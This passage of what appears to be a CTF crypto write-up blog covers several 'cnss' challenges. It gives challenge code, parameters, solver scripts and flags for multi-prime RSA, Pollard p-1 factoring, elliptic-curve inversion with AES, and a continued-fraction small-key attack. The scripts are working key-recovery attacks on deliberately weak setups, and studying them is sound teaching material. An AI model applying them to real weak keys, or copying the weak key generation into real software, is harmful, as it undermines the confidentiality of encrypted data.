12253096079262730693787845304459770181159272160708761390419517461435886798119494973936186382645490774511179747402693066192362104144553287739427091488849987</span></span><br><span class="line"><span class="string">q = 9656184899794050073098614505490788837141112476549205418072011388278372195682566976277132351856116300104728124405389485440262266612903835574949734938773879</span></span><br><span class="line"><span class="string">n = 1068394811940475700113916170772008310607904879176073274337669322446687936907143981238893756179197975634434673229920275765973807209412891205884402965483756254507691419368528133959132303476165747992107800736918701005971552264644185146124560027884795936191839406241406301141310602020436434278421529178345240902508007101551941438277539664839258109542374751444222500079818129540895166090788487787028178055561786822480872065405947357363186718845196587434430898650662917</span></span><br><span class="line"><span class="string">c = 364812620179131273680130240148084836403846027393384913159162092631491386521136431985815726041640268869899250546875572473450702105133851945618590296616284218872409897353796638895758963083075264218372930102765065661636950920355098372841435042642748593167374414989630427181232399218196685772309403529745406119979371226428026631723070867224675860939203796555567951762311063010081727524747799375832842589314306700599116049075415601108806973017635507910763925927172362</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">n = </span><br><span class="line">c = </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">r = n//p//q</span><br><span class="line">d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br></pre></td></tr></table></figure><p><code>cnss&#123;1t is similar to two-prime RSA....&#125;</code><br /><code>RSA</code></p><h2 id="fun_factoring"><a class="markdownIt-Anchor" href="#fun_factoring"></a>  Fun_factoring</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> next_prime</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag1, flag2</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    primes = []</span><br><span class="line">    p = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(primes) &lt; <span class="number">100</span>:</span><br><span class="line">        p = next_prime(p)</span><br><span class="line">        primes.append(<span class="built_in">int</span>(p))</span><br><span class="line">    <span class="keyword">return</span> primes</span><br><span class="line">primes = init()</span><br><span class="line">p1 = getPrime(<span class="number">256</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    q1 = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> q1.bit_length() &lt; <span class="number">255</span>:</span><br><span class="line">        q1 *= random.choice(primes)</span><br><span class="line">    q1 = q1 + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> isPrime(q1):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">n1 = p1 * q1</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m1 = bytes_to_long(flag1)</span><br><span class="line">c1 = <span class="built_in">pow</span>(m1, e, n1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;n1 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c1 = &#125;</span>&#x27;</span>)</span><br><span class="line">m2 = bytes_to_long(flag2)</span><br><span class="line">p2 = getPrime(<span class="number">256</span>)</span><br><span class="line">q2 = getPrime(<span class="number">256</span>)</span><br><span class="line">n2 = p2 * q2</span><br><span class="line">c2 = <span class="built_in">pow</span>(m2, e, n2)</span><br><span class="line">phi = (p2 - <span class="number">1</span>) * (q2 - <span class="number">1</span>)</span><br><span class="line">e2 = getPrime(<span class="number">256</span>)</span><br><span class="line">d2 = inverse(e2, phi)</span><br><span class="line">hint1 = getPrime(<span class="number">256</span>) * n2</span><br><span class="line">hint2 = e2 * d2</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c2 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;hint1 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;hint2 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n1 = 29993156790273796411588637755401407649619741972315831791586727944419911570896819043688187483218756247767784823799572993962152654560761989054087817767687901</span></span><br><span class="line"><span class="string">c1 = 28308885699728621592812918494757273712938007912315485487807230648420711341284570451708049371754826651903406663574768899937862287581243099737368091309807825</span></span><br><span class="line"><span class="string">c2 = 3677242432073556679040222440039877927024312077564452145956625214187804614184186227277646425370459616386984491952553180136037741092781602470053045143802537</span></span><br><span class="line"><span class="string">hint1 = 397340046977096077577115578026599912881304442662450049334426974861677656259439266980515145452369301652618056238525786266286451780972189318240092026572582216328286841448920434798083168400087303822060653407466964485682775061825982767</span></span><br><span class="line"><span class="string">hint2 = 42319976894927564843833810567252442522907372281560684051129782019144211533194692653447095916384084531450449319697685128778953472384491084162072476640254892049041007337641419872550411941455264025858397584349456909103991157799852081</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Poolard_p_1</span>(<span class="params">N</span>):</span><br><span class="line">    a, n = <span class="number">2</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a = <span class="built_in">pow</span>(a, n, N)</span><br><span class="line">        res = GCD(a-<span class="number">1</span>, N)</span><br><span class="line">        <span class="keyword">if</span> res != <span class="number">1</span> <span class="keyword">and</span> res != N:</span><br><span class="line">            q = N // res</span><br><span class="line">            <span class="keyword">return</span> res, q</span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getpq</span>(<span class="params">n, ed</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        k = ed - <span class="number">1</span></span><br><span class="line">        g = random.randint(<span class="number">0</span>, n)</span><br><span class="line">        <span class="keyword">while</span> k % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            k = k//<span class="number">2</span></span><br><span class="line">            temp = <span class="built_in">pow</span>(g, k, n)-<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> GCD(temp, n) &gt; <span class="number">1</span> <span class="keyword">and</span> temp != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> GCD(temp, n), n//GCD(temp, n)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n1 = </span><br><span class="line">c1 = </span><br><span class="line">c2 = </span><br><span class="line">hint1 = </span><br><span class="line">hint2 = </span><br><span class="line"><span class="comment"># p, q = </span></span><br><span class="line">p, q = Poolard_p_1(n1)</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">flag1 = long_to_bytes(<span class="built_in">pow</span>(c1, d, n1))</span><br><span class="line">n2, r = getpq(hint1, hint2)</span><br><span class="line">p, q = getpq(n2, hint2)</span><br><span class="line"><span class="built_in">print</span>(p*q == n2)</span><br><span class="line"><span class="built_in">print</span>(p*q == r)</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">flag2 = long_to_bytes(<span class="built_in">pow</span>(c2, d, n2))</span><br><span class="line"><span class="built_in">print</span>(flag1)</span><br><span class="line"><span class="built_in">print</span>(flag2)</span><br></pre></td></tr></table></figure><p><code>q1-1</code>()<code>Pollard's p-1</code><code>n1</code></p><p><code>hint2 = e2 * d2</code><code>e*d,n</code><code>n</code><br /><img src="https://picx.zhimg.com/80/v2-54c76534bf4e9c1e82b0b1023c05daa8_1440w.png" alt="" /><br /><code>hint2</code><code>hint1</code><br /><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>g</mi><mrow><mi>e</mi><mi>d</mi><mo></mo><mn>1</mn></mrow></msup><mo></mo><mn>1</mn><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>h</mi><mi>i</mi><mi>n</mi><mi>t</mi><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">g^{ed-1}\equiv 1(mod\ hint1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.043548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">d</span><span class="mbin mtight"></span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord">1</span><span class="mclose">)</span></span></span></span><br /><br /><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>g</mi><mrow><mi></mi><mo stretchy="false">(</mo><msub><mi>n</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo></mo><mo stretchy="false">(</mo><mi>r</mi><mo></mo><mn>1</mn><mo stretchy="false">)</mo></mrow></msup><mo></mo><mn>1</mn><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>h</mi><mi>i</mi><mi>n</mi><mi>t</mi><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">g^{\phi (n_{2})*(r-1)}\equiv 1(mod\ hint1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0824399999999998em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight"></span><span class="mopen mtight">(</span><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mclose mtight">)</span><span class="mbin mtight"></span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span><span class="mbin mtight"></span><span class="mord mtight">1</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord">1</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><mi>e</mi><mi>d</mi><mo></mo><mn>1</mn><mo>=</mo><mi>k</mi><mi></mi><mo stretchy="false">(</mo><msub><mi>n</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mtext></mtext><mi>k</mi><mo>&gt;</mo><mo>&gt;</mo><mi>r</mi><mo></mo><mn>1</mn></mrow><annotation encoding="application/x-tex">ed-1=k\phi(n_{2})k&gt;&gt;r-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span><br /></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">b<span class="string">&#x27;cnss&#123;1f_y0u_Kn0w_Pollard_y0u_Kn0w_1t_4ll&#125;&#x27;</span></span><br><span class="line">b<span class="string">&#x27;cnss&#123;Factoring_the_modulus_1s_FUn_fuN_Fun_f0r_The_whOLe_F4miLY!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><code>Pollard's p-1e*dn</code></p><h2 id="babycurve"><a class="markdownIt-Anchor" href="#babycurve"></a>  BabyCurve</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    enc = cipher.encrypt(pad(data, AES.block_size))</span><br><span class="line">    <span class="keyword">return</span> enc</span><br><span class="line">p = <span class="number">9348030992978262347982920431034912130716881552084115381757548130699185130820479730646974634141092089651314678852571714802122984104452942803209295252010181</span></span><br><span class="line">a = <span class="number">7763518046982192251231517150944105482004832971680748456996310159078009542876654956303764776823623497403884988108392624824526960061132573798331838835960909</span></span><br><span class="line">b = <span class="number">10997613169313236085705837600762108982163011398922795151006166411501358991822489779966644769325114384948484844491824976044124478063235526767931678399125511</span></span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    key = urandom(<span class="number">16</span>)</span><br><span class="line">    x = ZZ(bytes_to_long(key))</span><br><span class="line">    <span class="keyword">if</span> E.is_x_coord(x):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">enc = encrypt(flag, key)</span><br><span class="line">P = E.lift_x(x)</span><br><span class="line">Q = e * P</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Q = <span class="subst">&#123;(Q[<span class="number">0</span>], Q[<span class="number">1</span>])&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;enc = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Q = (702269728158503157149596097443623465665001736303612719716566418594125500303838352102906729735173073066319779069987350585597471722439620961396365725087358, 7741251535874845030195254089473397439416170375681731646623904995909698213716045714883145323049811857989495704699439881764120694648581710750825272993480662)</span></span><br><span class="line"><span class="string">enc = b&#x27;c\xea\x0eO\xf1V\n&quot;\xf4\xd5V\x10\x06\x85\xd8a\xe5`\xab\xd4\x9b\x96Fz+:\x0b\xaeg-\x92\xe6\xfb:\xc7\xaf\x1b&lt;\x04\xf0\x81\xb8\xbf\xc6\x96\x16q\x17\xd0\xb4F\x92L]\xa4\xe9|\xe1\xafg?\x1c\x88u&#123;\x91\xe5=\x0c\xdb\xb6S\x02\xdd4\x90F.\xe8\xa9&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = </span><br><span class="line">a = </span><br><span class="line">b = </span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">Q = </span><br><span class="line">Q=E.point(Q)</span><br><span class="line">d=inverse(e,E.order())</span><br><span class="line">P=d*Q</span><br><span class="line">x=P[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    dec = cipher.decrypt(data)</span><br><span class="line">    <span class="keyword">return</span> dec</span><br><span class="line">enc = <span class="string">b&#x27;c\xea\x0eO\xf1V\n&quot;\xf4\xd5V\x10\x06\x85\xd8a\xe5`\xab\xd4\x9b\x96Fz+:\x0b\xaeg-\x92\xe6\xfb:\xc7\xaf\x1b&lt;\x04\xf0\x81\xb8\xbf\xc6\x96\x16q\x17\xd0\xb4F\x92L]\xa4\xe9|\xe1\xafg?\x1c\x88u&#123;\x91\xe5=\x0c\xdb\xb6S\x02\xdd4\x90F.\xe8\xa9&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(decrypt(enc, long_to_bytes(<span class="built_in">int</span>(x))))</span><br></pre></td></tr></table></figure><p><code>Q = e * P</code><code>P = Q*inverse(e,E.order())</code><br /><code>cnss&#123;The elliptic curve 0ver a fin1te f1eld is an ab3lian group!&#125;</code></p><p><code>ECC+AES</code></p><h2 id="small-private-key"><a class="markdownIt-Anchor" href="#small-private-key"></a>  Small private key</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p**<span class="number">2</span> * q</span><br><span class="line">beta = <span class="number">0.17</span></span><br><span class="line">d = getPrime(<span class="built_in">int</span>(n.bit_length() * beta))</span><br><span class="line">phi = p * (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">e = inverse(d, phi)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;e = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">e = 99229505005010231229812309405118621210000665411317929329600320339351298536042106221904006618372016899838834315350282056201576780947332634472383794182914396787560149770087768346108970874622698958641239168672884943722683097496196568051260666405536471900271607250500649553508481028777575476228205350216263899864839231023168979708315202587104442940310612179957452668838181940302165426024768292895768359058100485442771122055233699699591861456009579197208612724634653</span></span><br><span class="line"><span class="string">n = 777932066471261253953635643543769273870576807001853821365002899038017652136640326606707541086305255419688451331308105858262381681205657118149670724969402173491693110671887550886032285747295962582655746980079520315019448934437742771629769039207570002600238133829941166519652324878087610266956030449933384381670213413005273221487049001640280300893616812980727738757188984406451974046745624206457936867759992076616467784551949417643382015447862723484003189099322113</span></span><br><span class="line"><span class="string">c = 315162533057119030644069576898014821746187831990641977888442441986396488578480924344830827691640071104116111429579458497274291449212879753454215527936892759921631840278976085540574066181311866181244489267112630519512826615435097016920565522260797348024774745088674028891909401404506165402416608686728774514537539009768594970540227164117320018763121106885108998344223691343126585144804733329828035450075042672319188914135360404008915353519214959250876459809490891</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e = </span><br><span class="line">n = </span><br><span class="line">c = </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ContinuedFraction</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, numerator, denumerator</span>):</span><br><span class="line">        self.numberlist = []</span><br><span class="line">        self.fractionlist = []</span><br><span class="line">        self.GenerateNumberList(numerator, denumerator)</span><br><span class="line">        self.GenerateFractionList()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GenerateNumberList</span>(<span class="params">self, numerator, denumerator</span>):</span><br><span class="line">        <span class="keyword">while</span> numerator != <span class="number">1</span>:</span><br><span class="line">            quotient = numerator//denumerator</span><br><span class="line">            remainder = numerator % denumerator</span><br><span class="line">            self.numberlist.append(quotient)</span><br><span class="line">            numerator = denumerator</span><br><span class="line">            denumerator = remainder</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GenerateFractionList</span>(<span class="params">self</span>):</span><br><span class="line">        self.fractionlist.append([self.numberlist[<span class="number">0</span>], <span class="number">1</span>])</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(self.numberlist)):</span><br><span class="line">            numerator = self.numberlist[i]</span><br><span class="line">            denumerator = <span class="number">1</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">                temp = numerator</span><br><span class="line">                numerator = denumerator+numerator*self.numberlist[i-j-<span class="number">1</span>]</span><br><span class="line">                denumerator = temp</span><br><span class="line">            self.fractionlist.append([numerator, denumerator])</span><br><span class="line">n_3 = gmpy2.iroot(n, <span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line">near = n-(<span class="number">2</span>*<span class="built_in">pow</span>(n_3, <span class="number">2</span>)-n_3)</span><br><span class="line">a = ContinuedFraction(e, near)</span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> k, d <span class="keyword">in</span> a.fractionlist:</span><br><span class="line">    <span class="keyword">if</span> k == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> (e * d - <span class="number">1</span>) % k != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">    result.append(phi)</span><br><span class="line"><span class="keyword">for</span> phi <span class="keyword">in</span> result:</span><br><span class="line">    d = inverse(e, phi)</span><br><span class="line">    flag = long_to_bytes(<span class="built_in">pow</span>(c, d, n))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;cnss&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><code>d</code><code>winner attack</code><code>n=p**2*q</code><br /><a href="https://iopscience.iop.org/article/10.1088/1742-6596/622/1/012019/pdf">https://iopscience.iop.org/article/10.1088/1742-6596/622/1/012019/pdf</a><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi></mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo></mo><mi>n</mi><mo></mo><mo stretchy="false">(</mo><mn>2</mn><mo></mo><msup><mi>n</mi><mrow><mn>2</mn><mi mathvariant="normal">/</mi><mn>3</mn></mrow></msup><mo></mo><msup><mi>n</mi><mrow><mn>1</mn><mi mathvariant="normal">/</mi><mn>3</mn></mrow></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(n)\approx n-(2*n^{2/3}-n^{1/3})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal"></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9713299999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">/</span><span class="mord mtight">3</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.138em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">/</span><span class="mord mtight">3</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span><br /><code>cnss&#123;Th1s is the p0wer of continu3d fr@ction hhhhhhh&#125;</code></p><p><code>winner attack</code></p><h2 id="-"><a class="markdownIt-Anchor" href="#-"></a>  </h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> prod</span><br><span class="line"><span class="keyword">from</span> Secret <span class="keyword">import</span> flag</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"><span class="keyword">assert</span> m.bit_length() &lt; <span class="number">256</span></span><br><span class="line">factors = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    factors.append(getPrime(<span class="number">64</span>))</span><br><span class="line">factors.append(getPrime(<span class="number">256</span>))</span><br><span class="line">n = prod(factors)</span><br><span class="line">g = <span class="number">7</span></span><br><span class="line">h = <span class="built_in">pow</span>(g, m, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span 